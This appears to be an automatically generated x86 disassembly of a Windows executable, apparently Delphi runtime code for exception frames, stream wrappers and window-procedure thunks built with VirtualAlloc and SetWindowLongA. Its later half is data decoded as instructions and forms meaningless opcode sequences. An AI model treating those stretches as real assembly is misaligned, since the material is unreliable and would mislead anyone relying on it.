pop ebp
retn 0x4
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_421e2c
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
cmp [ esi + 0x10 ] 0x1
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4031dc
test bl bl
jle r-xdata
mov eax [ esi + 0xc ]
call sub_4031ec
xor eax eax
mov [ esi + 0xc ] eax
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_421e64
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421eb3
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421ecc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebp
push sub_421f1b
push [ fs : ecx ]
mov [ fs : ecx ] esp
test edx edx
jne r-xdata
mov eax [ eax + 0xc ]
mov ecx [ ebp + 0x10 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ebx 0x80030009
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp + 0x14 ]
mov [ edx ] eax
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
sub_421f34
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx [ ebp + 0x14 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_421f9e
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jl r-xdata
mov ebx 0x80030001
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp ebx 0x2
jle r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ esi + 0xc ]
mov ecx ebx
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x14 ]
cdq
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] edx
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x8 ]
mov [ eax ] edx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x4 ] edx
sub_421fb8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_422001
push [ fs : eax ]
mov [ fs : eax ] esp
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebx + 0xc ]
call sub_41b420
mov eax [ ebx + 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ ebp + 0x10 ]
jne r-xdata
je r-xdata
cmp eax [ ebp + 0xc ]
xor ebx ebx
mov ebx 0x80004005
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42201c
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
call sub_405914
xor eax eax
push ebp
push sub_422209
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
xor edx edx
push ebp
push sub_4221e2
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x100000
jbe r-xdata
mov eax [ ebp + 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0xc ] 0x100000
jmp r-xdata
jmp r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
call sub_40276c
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_4221d1
push [ fs : edx ]
mov [ fs : edx ] esp
jmp r-xdata
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
ja r-xdata
cmp [ ebp + 0x14 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40278c
mov eax [ ebp + 0x1c ]
test eax eax
je r-xdata
jmp r-xdata
jle r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
jbe r-xdata
mov eax [ ebp + 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x1c ]
mov edx [ ebp - 0x20 ]
mov [ eax ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x4 ] edx
mov esi [ ebp + 0x10 ]
mov esi 0x7fffffff
jmp r-xdata
jmp r-xdata
retn
mov eax [ ebp + 0x18 ]
mov edx [ ebp - 0x18 ]
mov [ eax ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x4 ] edx
cmp esi [ ebp - 0xc ]
jle r-xdata
test esi esi
jle r-xdata
mov eax esi
mov eax [ ebp - 0xc ]
jmp r-xdata
mov eax ebx
cdq
add [ ebp - 0x18 ] eax
adc [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
push ebx
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x28 ]
mov edx [ ebp - 0x24 ]
add [ ebp - 0x20 ] eax
adc [ ebp - 0x1c ] edx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0xc ]
xchg ecx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
cmp ebx eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422210
lea eax [ ebp + 0xc ]
call sub_4058a0
retn
sub esi ebx
mov eax ebx
cdq
sub [ ebp + 0x10 ] eax
sbb [ ebp + 0x14 ] edx
test esi esi
jg r-xdata
call sub_403a64
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebp - 0x4 ] 0x80004005
sub_42224c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor esi esi
xor eax eax
push ebp
push sub_4222af
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov [ ebx + 0x4 ] 0x2
mov eax [ edi + 0xc ]
mov edx [ eax ]
call [ edx ]
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] edx
xor eax eax
mov [ ebx + 0x10 ] eax
xor eax eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x18 ] eax
xor eax eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x20 ] eax
xor eax eax
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x2c ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
sub_4222e0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_419188
mov edi eax
xor eax eax
push ebp
push sub_422335
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42233c
mov eax [ rw-data ]
call sub_4191ec
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_418dc4
call sub_4031ec
inc esi
dec ebx
jne r-xdata
sub_422354
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov edx esp
mov eax [ ecx + 0x4 ]
call [ ecx ]
add esp 0xc
pop eax
pop ebp
retn 0x10
sub_42237c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
cmp [ edi ] 0x0
jne r-xdata
mov eax [ edi ]
mov ebx [ edi ]
mov edx [ ebx + 0x5 ]
mov [ edi ] edx
mov edx [ ebp + 0x8 ]
mov [ ebx + 0x5 ] edx
mov edx [ ebp + 0xc ]
mov [ ebx + 0x9 ] edx
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
push 0x40
push 0x1000
push 0x1000
push 0x0
call VirtualAlloc
mov esi eax
mov eax [ rw-data ]
mov [ esi ] eax
lea edx [ esi + 0x4 ]
mov eax rw-data
mov ecx 0x2
call sub_402968
mov edx sub_422354
lea eax [ esi + 0x5 ]
call sub_422374
mov [ esi + 0x6 ] eax
lea ebx [ esi + 0xa ]
mov [ ebx ] 0xe8
lea edx [ esi + 0x4 ]
mov eax ebx
call sub_422374
mov [ ebx + 0x1 ] eax
mov eax [ edi ]
mov [ ebx + 0x5 ] eax
mov [ edi ] ebx
add ebx 0xd
mov eax ebx
sub eax esi
cmp eax 0xffc
jl r-xdata
mov [ rw-data ] esi
sub_422438
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
mov eax [ rw-data ]
mov [ rw-data ] eax
lea eax [ ebp - 0x28 ]
push eax
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test al al
je r-xdata
mov edx DefWindowProcA
cmp edx [ ebp - 0x24 ]
je r-xdata
push rw-data
call RegisterClassA
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
push eax
call UnregisterClassA
push 0x80000000
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push 0x0
mov ecx r-xdata
mov edx [ rw-data ]
mov eax 0x80
call sub_406cd8
mov ebx eax
cmp [ ebp + 0xa ] 0x0
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_42237c
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
sub_4224ec
push ebx
push esi
mov esi eax
push 0xfffffffc
push esi
call GetWindowLongA
mov ebx eax
push esi
call DestroyWindow
cmp ebx DefWindowProcA
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_422414
sub_422514
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4225b8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4225bf
retn
mov eax [ rw-data ]
call sub_4183ac
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x14 ]
call sub_4222e0
xor edx edx
xor eax eax
call sub_41c384
mov eax rw-data
call sub_40d538
call sub_405fd0
lea eax [ eax + 0xc ]
call sub_40d538
mov eax rw-data
call sub_40d538
mov eax rw-data
call sub_4058a0
mov eax sub_42234c
call sub_40573c
mov eax rw-data
call sub_40d538
call sub_42110c
mov eax rw-data
call sub_40d538
mov eax rw-data
call sub_4058a0
sub_4225c4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42264d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_422654
retn
call sub_4210d8
mov eax sub_42234c
call sub_405734
mov dl 0x1
mov eax [ r-xdata ]
call sub_40d278
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_4058b8
mov dl 0x1
mov eax [ r-xdata ]
call sub_417ca8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419030
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_419030
mov [ rw-data ] eax
sub edx 0xffffffd4
sub_422658
push 0x8c004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebp + 0x680000ff ] cl
xchg esi eax
dec eax
add [ esi + 0x680000ff ] cl
xchg esi eax
dec eax
add [ edi + 0x680000ff ] cl
xchg esi eax
dec eax
add [ eax - 0x1 ] dh
add [ eax ] al
push 0x71004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edx - 0x1 ] dh
add [ eax ] al
push 0x73004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + edi * 8 ] dh
add [ eax - 0x6a ] ch
dec eax
add [ ebp - 0x1 ] dh
add [ eax ] al
push 0x76004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi - 0x1 ] dh
add [ eax ] al
push 0x78004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx - 0x1 ] bh
add [ eax ] al
push 0x7a004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx - 0x1 ] bh
add [ eax ] al
push 0x7c004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebp - 0x1 ] bh
add [ eax ] al
push 0x7e004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi - 0x1 ] bh
add [ eax ] al
push 0x60004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx - 0x1 ] ah
add [ eax ] al
push 0x62004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx - 0x1 ] ah
add [ eax ] al
push 0x64004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebp - 0x1 ] ah
add [ eax ] al
push 0x66004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi - 0x1 ] ah
add [ eax ] al
push 0x68004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx - 0x1 ] ch
add [ eax ] al
push 0x6a004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx - 0x1 ] ch
add [ eax ] al
push 0x6c004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebp - 0x1 ] ch
add [ eax ] al
push 0x6e004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi - 0x1 ] ch
add [ eax ] al
push 0x50004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx - 0x1 ] dl
add [ eax ] al
push 0x52004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx - 0x1 ] dl
add [ eax ] al
push 0x54004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebp - 0x1 ] dl
add [ eax ] al
push 0x56004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi - 0x1 ] dl
add [ eax ] al
push 0x58004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx - 0x1 ] bl
add [ eax ] al
push 0x5a004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx - 0x1 ] bl
add [ eax ] al
push 0x5c004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebp - 0x1 ] bl
add [ eax ] al
push 0x5e004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi - 0x1 ] bl
add [ eax ] al
push 0x40004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx - 0x1 ] al
add [ eax ] al
push 0x42004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx - 0x1 ] al
add [ eax ] al
push 0x44004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebp - 0x1 ] al
add [ eax ] al
push 0x46004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi - 0x1 ] al
add [ eax ] al
push 0x48004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx - 0x1 ] cl
add [ eax ] al
push 0x4a004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx - 0x1 ] cl
add [ eax ] al
push 0x4c004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebp - 0x1 ] cl
add [ eax ] al
push 0x4e004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi - 0x1 ] cl
add [ eax ] al
push 0x30004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx ] dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edx ] dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx ] dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + edi * 8 ] dh
add [ eax ] al
push 0x35004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ esi ] dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi ] dh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ eax ] bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx ] bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edx ] bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx ] bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + edi * 8 ] bh
add [ eax ] al
push 0x3d004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ esi ] bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi ] bh
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ eax ] ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx ] ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edx ] ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx ] ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + edi * 8 ] ah
add [ eax ] al
push 0x25004896
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ esi ] ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi ] ah
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ eax ] ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ecx ] ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edx ] ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ ebx ] ch
inc [ eax ]
add [ eax - 0x6a ] ch
dec eax
add [ edi + edi * 8 ] ch
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_422985
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42298c
retn
sub_422998
pushfd
sub [ edx ] eax
add [ esi ] eax
push esp
inc ebx
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax + 0x7fffffff ] al
lea eax [ eax ]
cld
sub [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
sub [ edx ] eax
or al 0x0
add [ eax ] al
sub [ edx + 0x40 ] dh
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
cmovne ecx [ ecx + 0x6e ]
jbe r-xdata
popad
jo r-xdata
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ eax + 0x2a ] bx
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2a ] bl
inc edx
add [ eax + eax ] cl
add [ eax ] al
sub [ edx + 0x40 ] dh
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
xor [ eax ] eax
sbb [ ebp + 0x49 ] al
outsb
jbe r-xdata
push esp
inc esi
imul esp [ ebx + 0x4f ] 0x61726570
inc esi
outsd
insb
imul esp [ edi + eax * 2 + 0x72 ] 0x69687061
arpl [ edi + 0x70 ] cx
jb r-xdata
jb r-xdata
push 0x65737261
je r-xdata
outsd
outsb
lea eax [ eax ]
js r-xdata
jae r-xdata
popad
insd
nop
int3
je r-xdata
je r-xdata
imul ebp [ esi + 0x65 ] 0x5373660b
add [ eax ] al
add bh bh
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ edx ]
push esp
inc esi
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
inc [ eax ]
add [ eax ] al
nop
call 0x3426d13
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
inc edx
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
jae r-xdata
outsb
pop es
jo r-xdata
jo r-xdata
imul ebp [ ebx + 0x65 ] 0x874754f
inc edi
jb r-xdata
jae r-xdata
je r-xdata
dec ecx
je r-xdata
popad
bound ebp [ ebp + 0x7 ]
outsd
outsb
je r-xdata
imul esi [ ebx + 0x68 ] 0x1
add [ edx ] al
add [ eax ] al
add [ edx + ebp + 0x42 ] dh
add [ ecx ] cl
jo r-xdata
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ edi ] cl
add [ eax ] al
add [ ebx + ebp + 0x70070042 ] dh
insd
outsd
insb
imul esp [ esi + eax + 0x70 ] 0x73614473
push 0x44737005
outsd
or al 0x70
inc ebx
insb
popad
jb r-xdata
jo r-xdata
inc esp
inc esp
outsd
je r-xdata
jo r-xdata
sub al [ edx ]
mov eax eax
push eax
sub eax [ edx ]
add ecx [ ecx ]
push esp
push eax
outsb
push ebx
je r-xdata
in al 0x2a
inc edx
add [ ebx + 0x422b50c0 ] cl
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] edx
outsb
push ebx
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah ah
sub al [ edx ]
push es
push es
jo r-xdata
jb r-xdata
insb
imul esp [ ebx + 0xb ] 0x6e557366
imul edi [ eax + 0x65 ] 0x72470864
popad
jo r-xdata
je r-xdata
popa
jne r-xdata
insd
push edi
push 0x5657469
jo r-xdata
or al 0x70
jae r-xdata
jo r-xdata
push ebx
je r-xdata
push eax
or [ edi + 0x72 ] al
jo r-xdata
arpl [ ebx - 0x75 ] si
dec ebp
jb r-xdata
outsd
je r-xdata
imul eax [ edi ] 0x70
insd
outsd
imul esp [ ebx + 0x73 ] 0x2b38c08b
inc edx
add [ esi ] al
or edx [ esi + eax * 2 + 0x6f ]
outsb
je r-xdata
inc edx
insb
popad
arpl [ ebx + 0x7 ] bp
jo r-xdata
insb
add [ gs : eax ] eax
add [ eax ] al
add [ esi ] al
add [ eax ] al
add [ ebx + ebp + 0x42 ] cl
add [ edi ] al
jo r-xdata
outsd
jo r-xdata
inc esp
popad
jae r-xdata
je r-xdata
or esp [ gs : esi + 0x73 ]
push ebx
outsb
je r-xdata
imul esp [ ebx + 0x73 ] 0x422abc90
add [ edx ] cl
or [ esi + eax * 2 + 0x6f ] edx
insb
or [ fs : esi + 0x73 ] ah
je r-xdata
bound esi [ ebx + 0x46 ]
or [ eax + 0x6d ] esi
dec esi
outsd
je r-xdata
dec esi
outsd
pop es
jo r-xdata
popad
jae r-xdata
jo r-xdata
inc esp
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
pushad
sub eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
sub eax 0x2d4c0042
insb
or al 0x70
insd
dec ebp
popad
jae r-xdata
jo r-xdata
imul esp [ ebx + 0x73 ] 0x422bb890
add [ ebx ] al
or [ eax + edx * 2 + 0x65 ] dl
outsb
outsb
dec esi
outsd
je r-xdata
dec ecx
outsb
add [ eax ] bl
add [ eax ] al
add [ esi + 0x34340041 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x2d ] ah
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ebp + 0x42 ] al
jae r-xdata
shl [ esp + ebp + 0x42 ] 0x0
add ecx [ ebx ]
push esp
inc edx
jb r-xdata
push 0x8b736369
push eax
outsb
dec esi
outsd
insd
outsd
jo r-xdata
jae r-xdata
or eax 0x6e497370
je r-xdata
je r-xdata
jo r-xdata
add eax 0x6f4e6d70
imul eax [ 0x6f586d70 ] 0x72
or [ eax + 0x6d ] dh
dec esi
outsd
je r-xdata
add eax 0x6f4e6d70
je r-xdata
add eax 0x6f447370
jo r-xdata
pop es
jo r-xdata
add [ ecx ] al
add ch bh
jae r-xdata
jae r-xdata
popad
jae r-xdata
push es
je r-xdata
pop eax
dec esi
jo r-xdata
inc esp
outsd
or [ edi + 0x72 ] al
popad
jo r-xdata
or ah [ edx + 0x73 ]
push esi
jb r-xdata
bound esi [ ebx + 0x48 ]
jb r-xdata
bound esi [ ebx + 0x43 ]
insb
popad
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax + 0x2c ] dh
inc edx
add [ edi ] al
dec ebp
jb r-xdata
insd
inc esi
jb r-xdata
jb r-xdata
or eax 0x654d6d70
jb r-xdata
jo r-xdata
bound esi [ ebx + 0x53 ]
outsd
insb
imul esp [ edi + eax + 0x62 ] 0x656c4373
popad
pop es
jb r-xdata
or edx [ edx + eax * 2 + 0x72 ]
jne r-xdata
or eax 0x654d6d70
jb r-xdata
dec ebp
push eax
outsb
insb
imul esp [ ecx + 0x67 ] 0x6c616e6f
outsd
jb r-xdata
or [ eax + 0x6d ] esi
jae r-xdata
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
in al 0x2a
inc edx
add [ esi ] al
popad
inc ebx
inc edx
add [ edi ] cl
push esp
inc edi
jb r-xdata
or esp [ edx + 0x73 ]
inc esp
imul esp [ ecx + 0x67 ] 0x736f7243
jae r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ edx + 0x73 ]
inc edx
inc esp
imul esp [ ecx + 0x67 ] 0x6c616e6f
insb
add eax 0x6f586d70
jb r-xdata
inc ebx
outsd
jo r-xdata
mov eax eax
je r-xdata
inc edi
jb r-xdata
add [ eax ] al
mov [ 0x200042 ] ch
add [ eax ] al
add [ eax ] eax
std
call [ eax + 0x46 ]
inc edx
add [ 0x6e6f4654 ] al
je r-xdata
imul esp [ ebx + 0x73 ] 0xffff0001
nop
or al 0x2e
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bl
inc edx
add [ esi + ebp ] bh
add [ eax ] eax
imul esp [ ebx + 0x73 ] 0x656a624f
arpl [ eax + 0x2d ] si
inc edx
add [ edi ] al
andps xmm0 [ edi + 0x72 ]
popad
jo r-xdata
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + edx * 4 - 0x6b43ffbf ] ch
inc ecx
add ah al
xchg esp eax
inc ecx
add al bl
xchg ebx eax
inc ecx
inc esp
imul esp [ ebx + 0x61 ] 0x73620b6c
inc edx
jpe r-xdata
add [ gs : eax ] eax
add [ eax ] al
outsb
pop es
jo r-xdata
add [ edi ] al
dec esi
outsd
je r-xdata
je r-xdata
popad
jo r-xdata
insd
or [ gs : edi + 0x72 ] al
[ eax ]
jo r-xdata
dec ebp
popad
jae r-xdata
push es
jo r-xdata
inc edx
push 0x6c797453
nop
inc edi
cmp [ 0x42 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
imul esp [ ebx + 0x73 ] 0x2c74c08b
or al 0x62
inc edx
pop es
bound esi [ ebx + 0x43 ]
jb r-xdata
outsd
outsb
jo r-xdata
popad
jb r-xdata
inc edx
add [ edi ] al
add eax 0x6e6f4654
je r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] ch
inc edx
add [ edx ] dh
inc edx
cmp al 0x2e
imul esp [ ebx + 0x73 ] 0x656a624f
